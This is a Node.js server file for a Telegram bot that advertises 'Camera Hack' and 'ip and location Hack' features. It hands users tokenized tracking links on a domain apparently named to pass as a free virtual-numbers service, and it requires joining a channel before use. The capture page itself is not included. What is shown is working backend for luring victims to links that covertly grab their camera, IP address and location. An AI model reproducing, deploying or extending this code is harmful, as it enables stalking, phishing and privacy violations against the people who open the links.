// server.js
const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ===== Middleware =====
app.use(bodyParser.json({ limit: "20mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ===== CONFIG =====
const DOMAIN = "https://freevirtualnumbers.onrender.com";
const CHANNEL_USERNAME = "@devxtechzone";

// ===== User Tracking =====
const activeUsers = {};
const TOKEN_EXPIRY_MS = 10 * 60 * 1000;

setInterval(() => {
  const now = Date.now();
  for (const token in activeUsers) {
    if (now - activeUsers[token].createdAt > TOKEN_EXPIRY_MS) {
      delete activeUsers[token];
    }
  }
}, 2 * 60 * 1000);

function generateToken() {
  return crypto.randomBytes(8).toString("hex");
}

// ===== Force Join Check =====
async function isUserJoined(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);

    return (
      member.status === "creator" ||
      member.status === "administrator" ||
      member.status === "member"
    );
  } catch {
    return false;
  }
}

async function forceJoin(ctx) {
  return ctx.reply(
`🚫 ACCESS LOCKED

You must join our channel before using this bot.`,
{
  parse_mode: "HTML",
  ...Markup.inlineKeyboard([
    [Markup.button.url("📢 Join DevX Tech Zone", "https://t.me/devxtechzone")],
    [Markup.button.callback("✅ I Joined", "check_join")]
  ])
});
}

// ===== Menu =====
function mainMenu() {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("🎱 Pool Tracking", "pool"),
      Markup.button.callback("⚡ Normal Tracking", "normal")
    ],
    [
      Markup.button.callback("📊 Bot Stats", "stats"),
      Markup.button.callback("🧠 Info", "info")
    ],
    [Markup.button.callback("👨‍💻 Developer", "dev")],
    [
      Markup.button.url("🌐 Support Channel", "https://t.me/Mrddev"),
      Markup.button.url("🌐 DevX Tech Zone", "https://t.me/devxtechzone")
    ]
  ]);
}

// ===== START =====
bot.start(async (ctx) => {

  const joined = await isUserJoined(ctx);

  if (!joined) {
    return forceJoin(ctx);
  }

  await ctx.replyWithPhoto(
    "https://files.catbox.moe/v75lmb.jpeg",
    {
      caption: `
<b>🔱 PRO SYSTEM v3.0</b>

━━━━━━━━━━━━━━━━━━
⚡ Status: ONLINE
🤖 Engine: Telegraf
🌐 Server: Secure Cloud

Select a module below.
`,
      parse_mode: "HTML",
      ...mainMenu()
    }
  );
});

// ===== Check Join Button =====
bot.action("check_join", async (ctx) => {

  const joined = await isUserJoined(ctx);

  if (!joined) {
    return ctx.answerCbQuery("❌ Join the channel first", { show_alert: true });
  }

  await ctx.answerCbQuery("✅ Access Granted");

  await ctx.reply("🔓 Access Unlocked", mainMenu());
});

// ===== Pool Mode =====
bot.action("pool", async (ctx) => {
  await ctx.answerCbQuery();

  const token = generateToken();

  activeUsers[token] = {
    chat_id: ctx.chat.id,
    username: ctx.from.username,
    createdAt: Date.now()
  };

  const msg = await ctx.reply("⚙️ Initializing Pool Mode...");
  await new Promise(r => setTimeout(r, 1500));

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    undefined,
`
🎱 <b>POOL MODE</b>

━━━━━━━━━━━━━━━━━━

🔗 Your Link:
<code>${DOMAIN}?token=${token}</code>
`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]])
    }
  );
});

// ===== Normal Mode =====
bot.action("normal", async (ctx) => {
  await ctx.answerCbQuery();

  const token = generateToken();

  activeUsers[token] = {
    chat_id: ctx.chat.id,
    username: ctx.from.username,
    createdAt: Date.now()
  };

  const msg = await ctx.reply("⚙️ Preparing Normal Mode...");
  await new Promise(r => setTimeout(r, 1500));

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    undefined,
`
⚡ <b>NORMAL MODE</b>

━━━━━━━━━━━━━━━━━━

🔗 Your Link:
<code>${DOMAIN}?token=${token}</code>
`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]])
    }
  );
});

// ===== Stats =====
bot.action("stats", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.reply(
`📊 BOT STATS

Active Users: ${Object.keys(activeUsers).length}
Server: ONLINE
Version: v3.0`,
{ parse_mode: "HTML" });
});

// ===== Info =====
bot.action("info", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.reply(
`🧠 ABOUT

• Camera Hack
• ip and location Hack
• link exprires 10 mins`,
{ parse_mode: "HTML" });
});

// ===== Developer =====
bot.action("dev", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.reply(
`👨‍💻 Developer

Name: Mr Dev
Contact: @Mrddev`,
{ parse_mode: "HTML" });
});

// ===== Back =====
bot.action("back", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.editMessageText(
`<b>🔱 PRO SYSTEM v3.0</b>

Select a module below.`,
{
  parse_mode: "HTML",
  ...mainMenu()
});
});

// ===== Web Server =====
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public/index.html"));
});

// ===== Start Server =====
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});

// ===== Start Bot =====
bot.launch().then(() => {
  console.log("Telegram bot running");
});
